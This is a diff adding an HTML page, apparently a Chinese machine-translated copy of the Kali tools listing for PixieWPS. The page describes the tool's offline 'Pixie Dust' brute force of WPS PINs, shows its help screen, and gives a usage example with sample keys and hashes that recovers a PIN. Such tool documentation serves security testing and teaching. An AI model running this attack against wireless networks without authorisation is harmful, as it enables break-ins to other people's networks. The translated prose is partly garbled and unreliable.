@@ -1,0 +1,53 @@
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>kali工具箱</title>
+<script src="./static/bootstrap.min.js"></script>
+<link rel="stylesheet" href="./static/main.css">
+<link rel="stylesheet" href="./static/bootstrap.min.css">
+<style type="text/css" id="syntaxhighlighteranchor"></style>
+</head>
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+<article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+<section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+<h2> PixieWPS包装说明</h2><p style="text-align: justify;"> Pixiewps是用C写的一个工具，用于离线暴力破解的WPS PIN利用一些受影响的低或不存在的熵（一抹灰尘攻击）。它是为教育目的。所有学分的研究去多米尼克·邦加德。 </p><p>产品特点： </p><ul><li>校验和优化：它会先尝试进行有效的识别码（11&#39;000）; </li><li>降低种子的熵从32至25位用于C LCG伪随机函数; </li><li>小Diffie-Hellman密钥：并不需要指定公共注册处键如果相同的选项与掠夺者。 </li></ul><p>该方案还将首次尝试与E-S0 = E-S1 = 0，那么它会尝试暴力破解的PRNG的种子，如果-e-现时选项specificed。 </p><p>资料来源：https://forums.kali.org/showthread.php?25018-Pixiewps-wps-pixie-dust-attack-tool <br> <a href="https://github.com/wiire/pixiewps/" variation="deepblue" target="blank">PixieWPS首页</a> | <a href="http://git.kali.org/gitweb/?p=packages/pixiewps.git;a=summary" variation="deepblue" target="blank">卡利PixieWPS回购</a> <br> <a href="https://forums.kali.org/showthread.php?25018-Pixiewps-wps-pixie-dust-attack-tool" variation="deepblue" target="blank">卡利论坛主题</a> | <a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)" variation="deepblue" target="blank">社区研究主题</a> </p><ul><li>作者：wiire </li><li>许可：GPLv3的</li></ul><h3>包含在PixieWPS包工具</h3><h5> PixieWPS - 离线攻击的WPS PIN </h5><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="deacb1b1aa9eb5bfb2b7">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# pixiewps -h<br>
+<br>
+ Pixiewps made by wiire<br>
+<br>
+ Usage: pixiewps &lt;arguments&gt;<br>
+<br>
+ Required Arguments:<br>
+<br>
+    -e, --pke      : Enrollee public key<br>
+    -r, --pkr      : Registrar public key<br>
+    -s, --e-hash1  : E-Hash1<br>
+    -z, --e-hash2  : E-Hash2<br>
+    -a, --authkey  : Key used in HMAC SHA-256<br>
+<br>
+ Optional Arguments:<br>
+<br>
+    -n, --e-nonce  : Enrollee nonce<br>
+    -S, --dh-small : Small Diffie-Hellman keys (--pkr not needed)<br>
+<br>
+    -h, --help     : Display this usage screen<br>
+<br>
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="afddc0c0dbefc4cec3c6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~#</code><h3> PixieWPS用法示例</h3><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cdbfa2a2b98da6aca1a4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~# pixiewps \<br>
+&gt;    -a 7f:de:11:b9:69:1c:de:26:4a:21:a4:6f:eb:3d:b8:aa:aa:d7:30:09:09:32:b8:24:43:9b:e0:91:78:e7:6f:2c \<br>
+&gt;    -e d4:38:91:0d:4e:6e:15:fe:70:f0:97:a8:70:2a:b8:94:f5:75:74:bf:64:19:9f:92:82:9b:e0:2c:c0:a3:75:48:08:8f:63:0a:82:37:0c:b7:95:42:cf:55:ca:a5:f0:f7:6c:b2:c7:5f:0e:23:18:44:f4:2d:00:f1:da:d4:94:23:56:c7:2c:b0:f6:87:c7:77:d0:cc:11:35:cf:b7:4f:bc:44:8d:ca:35:8a:78:3d:99:7f:2b:cf:44:21:d8:e2:0f:3c:7d:a4:72:c8:03:6f:77:2a:e9:fa:c1:e9:a8:2c:74:65:99:5a:e0:a5:26:d9:23:5e:4e:ec:5a:07:07:ab:80:db:3f:5f:18:7f:fa:fa:f1:57:74:b2:8d:a9:97:a6:c6:0a:a5:e0:ec:93:09:23:67:f6:3e:ec:1f:55:32:a4:5d:73:8f:ab:91:74:cf:1d:79:85:12:c1:81:f5:ea:a6:68:9d:8e:c7:c6:be:01:dc:d9:f8:68:80:11:55:d7:44:6a \<br>
+&gt;    -r bc:ad:54:2f:88:44:7c:12:69:ef:34:31:4a:17:1c:92:b1:d7:06:4c:73:be:9f:d3:ed:87:63:74:10:46:0f:46:8c:36:b5:d4:a0:ba:af:85:9c:b2:30:42:d7:59:43:75:5a:d7:79:96:fb:ee:7b:66:db:b7:a8:f9:22:9c:a5:d3:b8:e7:c0:c4:5c:58:34:1f:56:a8:1a:41:a8:d2:e8:f6:3e:c9:3a:93:d9:9b:59:5c:a8:e0:78:84:6c:fc:05:e8:76:a3:e6:3b:33:94:4a:a9:ff:50:fb:60:fa:97:3b:6d:cc:04:f1:5e:36:24:a9:06:7a:f8:6b:00:e9:71:9d:89:be:9c:b2:9c:1f:ca:6d:d6:4d:ab:46:3d:b3:11:1f:8d:40:f7:c8:a4:39:48:c5:ca:1b:f6:30:95:7d:d9:68:41:ef:0a:37:b2:4a:37:e4:a4:b0:dd:7e:c1:af:3e:66:ea:bf:16:0a:7a:8a:05:00:01:a4:29:77:a9:d4:81:d4:0e \<br>
+&gt;    -s 90:5f:f5:7d:93:e5:c4:3c:62:0d:26:65:dd:59:57:d5:ba:ba:f1:b7:30:91:72:7c:54:94:38:08:1e:13:35:38 \<br>
+&gt;    -z b0:2b:07:50:28:e7:6e:5f:fa:27:1b:31:92:85:43:cb:c5:6a:ec:73:e2:27:c3:b9:80:ec:5b:ed:88:f0:1e:ec<br>
+<br>
+ [*] ES-1: 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00<br>
+ [*] ES-2: 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00<br>
+ [*] PSK1: d4:eb:0c:2a:38:15:e1:a0:3d:70:db:74:31:eb:53:a3<br>
+ [*] PSK2: d3:b7:e6:23:f3:1d:22:0a:23:ea:07:bb:7f:76:65:8b<br>
+ [+] WPS pin: 04847533<br>
+<br>
+ [*] Time taken: 0 s<br>
+<br>
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="88fae7e7fcc8e3e9e4e1">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~#</code><div style="display:none">
+<script src="//s11.cnzz.com/z_stat.php?id=1260038378&web_id=1260038378" language="JavaScript"></script>
+</div>
+</main></body></html>
